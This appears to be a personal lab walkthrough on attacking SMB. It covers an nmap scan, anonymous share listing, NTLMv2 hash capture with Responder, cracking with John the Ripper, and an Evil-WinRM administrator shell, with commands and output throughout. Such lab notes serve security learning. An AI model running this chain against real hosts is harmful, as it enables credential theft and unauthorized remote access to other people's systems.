# SMB - Server Message Block

A network communication protocol used for providing shared access to files, printers, and serial ports between nodes on a network. The SMB protocol allows applications or users to read and write to files and request services from server programs in a computer network.

- Port 139: This is used by the older NetBIOS over TCP/IP.
- Port 445: This is used by newer implementations of SMB over TCP/IP directly without the NetBIOS layer.

`nmap` scan results,

```sh
$ nmap -sV 10.129.48.207
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 19:41 EDT
Nmap scan report for 10.129.48.207
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
```

List shares on a server,

```sh
$ smbclient -L //10.129.48.207 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.48.207 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Connect to a share anonymously,

```sh
smbclient //10.129.48.207/WorkShares -N
```

## Get password hashes using Responder

If you can force a client to attempt to connect to a network share on your machine, you can get the password using `responder`. First, ensure that `samba` is not running so the ports are free, use `ip a` to get the interface to listen on, then run `responder`.

```sh
responder -I eth0
```

Under servers, ensure that `SMB server` is ON then have the target machine attempt to connect to your machine with `//10.10.15.210/someshare`. You should see the attempted connection,

```log
[SMB] NTLMv2-SSP Client   : 10.129.5.68
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ff17d23b82c667ae:58EAC5B515822DC4C78E1967535FAF2C:0101000000000000000649CB35CEDA018CB9596F746AC3EE000000000200080058004C003200570001001E00570049004E002D005A00410034004600450051005A00370045005A00510004003400570049004E002D005A00410034004600450051005A00370045005A0051002E0058004C00320057002E004C004F00430041004C000300140058004C00320057002E004C004F00430041004C000500140058004C00320057002E004C004F00430041004C0007000800000649CB35CEDA0106000400020000000800300030000000000000000100000000200000AC85969FA5E6B301DA25815ACC5D980D8F707190F2B6B3291F3A86F9698598DF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200310030000000000000000000
```

## Crack the password hash with John the Ripper

Copy the hash that you retrieved to a file,

```sh
echo "Administrator::RESPONDER:ff17d23b82c667ae:58EAC5B515822DC4C78E1967535FAF2C:0101000000000000000649CB35CEDA018CB9596F746AC3EE000000000200080058004C003200570001001E00570049004E002D005A00410034004600450051005A00370045005A00510004003400570049004E002D005A00410034004600450051005A00370045005A0051002E0058004C00320057002E004C004F00430041004C000300140058004C00320057002E004C004F00430041004C000500140058004C00320057002E004C004F00430041004C0007000800000649CB35CEDA0106000400020000000800300030000000000000000100000000200000AC85969FA5E6B301DA25815ACC5D980D8F707190F2B6B3291F3A86F9698598DF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200310030000000000000000000" > hash.txt
```

Then run `john` to find the password,

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Use the password to connect to the machine

In the responder scenario, we discover that port `5985` was open which is Windows Remote Management. We can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect to the target machine,

```sh
$ evil-winrm -i 10.129.148.151 -u Administrator -p badminton

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
```
